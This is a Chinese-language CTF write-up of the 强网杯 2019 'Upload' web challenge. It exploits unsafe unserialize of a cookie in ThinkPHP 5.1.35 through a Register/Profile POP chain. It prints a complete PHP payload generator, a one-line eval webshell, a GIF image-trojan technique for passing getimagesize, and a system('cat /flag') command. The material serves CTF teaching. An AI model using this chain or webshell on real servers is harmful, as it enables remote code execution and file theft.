---
title: 强网杯 2019 - Web - Upload
date: 2026-11-14 18:33:00
categories:
  - CTF
  - 强网杯 2019
  - Web
tags:
  - ThinkPHP 反序列化
  - POP 链
  - 图片马
  - 命名空间
  - getshell
cover: /img/cover/silver-hair-blue-eyes-girl.jpg
description: 强网杯 2019 ThinkPHP 反序列化题，www.tar.gz 泄漏源码，借 Register 析构触发 Profile 的 upload_img，把 GIF 图片马 copy 成 php 文件 getshell 读 flag。
keywords:
  - ThinkPHP
  - 反序列化
  - POP 链
  - 图片马
  - phar
ai: >-
  本题是强网杯 2019 的 Web 题 Upload，基于 ThinkPHP 5.1.35，考察 PHP 反序列化 POP 链与图片马 getshell 的组合。访问 www.tar.gz 可下载完整源码，审计发现登录校验会把 cookie 中的 user 字段 base64 解码后直接 unserialize，构成反序列化入口。目标是让 Register 析构时调用 checker 的 index 方法，而 checker 被设为 Profile 对象，其 __call 与 __get 魔术方法把调用一路转到 upload_img，进而把上传的图片马复制成 php 文件。踩坑点集中在三处：序列化类名必须写完整命名空间，upload_menu 字段要置空，以及图片马必须是能被 getimagesize 识别的合法 GIF 而非简单拼接文件头。构造好 payload 设置 cookie 触发反序列化，webshell 即可执行系统命令读取 flag。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 强网杯 2019 |
| 方向 | Web |
| 难度 | 中等 |
| 框架 | ThinkPHP 5.1.35 LTS（PHP 7.3.10 + openresty） |
| 环境 | 授权靶场（已脱敏） |

## 信息收集

访问 `/www.tar.gz` 泄露完整源码，审计确认触发点。绝对路径信息（`/var/www/html/public/`）属于部署环境，仅作解题叙事保留。

`Index::login_check()` 对 cookie `user` 做 `base64_decode` + `unserialize`：

```php
public function login_check(){
    $profile = cookie('user');
    $profile = base64_decode($profile);
    $this->profile = unserialize($profile);
    if($this->profile['ID']) { ... }
}
```

## 漏洞分析

漏洞类型：PHP 反序列化 POP 链 + 图片马 getshell。

目标：调用 `Profile::upload_img()`，把已上传的图片马 `copy` 成 `.php`。利用链：

```text
Register::__destruct()   → if(!$this->registed) $this->checker->index()
    ↓ checker = Profile 对象，调用不存在的 index() 方法
Profile::__call('index') → if($this->index) 触发 __get('index')
    ↓ __get 返回 except['index']
Profile::__get('index')  → 返回 $this->except['index'] = 'img'
    ↓ 最终调用 $this->img = 'upload_img'
Profile::upload_img()    → copy(filename_tmp, filename) 改名成 .php
```

`upload_img()` 关键逻辑：

```php
public function upload_img(){
    if($this->checker){           // 设 checker=null 跳过 login_check
        if(!$this->checker->login_check()){ ... }
    }
    if(!empty($_FILES)){ ... }    // 反序列化时无 $_FILES，跳过
    if($this->ext) {              // 设 ext='png' 通过
        if(getimagesize($this->filename_tmp)) {   // 需指向合法图片
            @copy($this->filename_tmp, $this->filename);
            @unlink($this->filename_tmp);
        }
    }
}
```

### 关键细节（踩坑点）

**这是本题最关键的地方，也是之前多次 500 失败的原因**：

1. **类名必须带完整命名空间**：序列化时类名要写 `O:27:"app\web\controller\Register"` 和 `O:26:"app\web\controller\Profile"`，而不是简写 `O:8:"Register"` / `O:7:"Profile"`。
2. **`upload_menu` 字段设为 `N;`（null）**，不能填具体值。
3. **路径用 `../public/upload/<md5(REMOTE_ADDR)>/`**：反序列化触发时工作目录是 `public/`，`../public/upload` 恰好解析回 `public/upload`。
4. **图片马必须是合法 GIF**：`getimagesize()` 才能返回 `image/gif`。旧版 `GIF89a<?php...` 是非法 GIF，`getimagesize` 失败。正确做法是 `GIF87a` 头 + 1x1 像素 + PHP 代码藏在 GIF 注释扩展块。

## 利用过程

1. **源码泄露**：下载 `/www.tar.gz`，定位 cookie 反序列化入口与 `upload_img` sink。
2. **构造 POP 链**：按「完整 EXP」生成序列化字符串并 base64 编码。
3. **上传图片马**：上传合法 GIF 图片马到 `public/upload` 对应目录。
4. **触发反序列化**：设置 cookie `user=<payload>` 访问 `/index.php/index`，图片马被 `copy` 成 `.php`。
5. **getshell 读 flag**：通过 webshell（`<?php @eval($_POST["cmd"]);?>`）执行 `cmd=system('cat /flag')` 得到 flag。

## 完整 EXP

生成 payload 的 PHP 脚本：

```php
class Register {
    public $checker;
    public $registed = 0;
}
class Profile {
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;
    public function __get($name){ return $this->except[$name]; }
    public function __call($name, $args){
        if($this->{$name}){ $this->{$this->{$name}}($args); }
    }
}
$p = new Profile();
$p->checker = null;
$p->filename_tmp = "../public/upload/<menu>/<md5>.png";
$p->filename     = "../public/upload/<menu>/<md5>.php";
$p->upload_menu  = null;
$p->ext = "png";
$p->img = "upload_img";
$p->except = ['index' => 'img'];
$r = new Register();
$r->registed = 0;
$r->checker = $p;
echo base64_encode(serialize($r));
```

其中 `<menu> = md5($_SERVER['REMOTE_ADDR'])`，`<md5> = md5("shell.png")`。

webshell 命令：

```bash
cmd=system('cat /flag')
```

## Flag

```text
flag{xxxx}
```

（通过 webshell 执行 `cat /flag` 读出，真实值已脱敏。）

## 踩坑与总结

- 类名必须写完整命名空间（`app\web\controller\Register` / `Profile`），否则反序列化找不到类，多次 500 皆因此。
- `upload_menu` 必须为 `N;`（null）。
- 路径 `../public/upload/...` 要与反序列化时的工作目录 `public/` 对应。
- 图片马必须是合法 GIF（`GIF87a` 头 + 1x1 像素，代码藏注释扩展块），简单 `GIF89a<?php` 过不了 `getimagesize`。
- 链的核心是 `Register::__destruct → Profile::__call → __get → upload_img → copy` 改名 getshell。
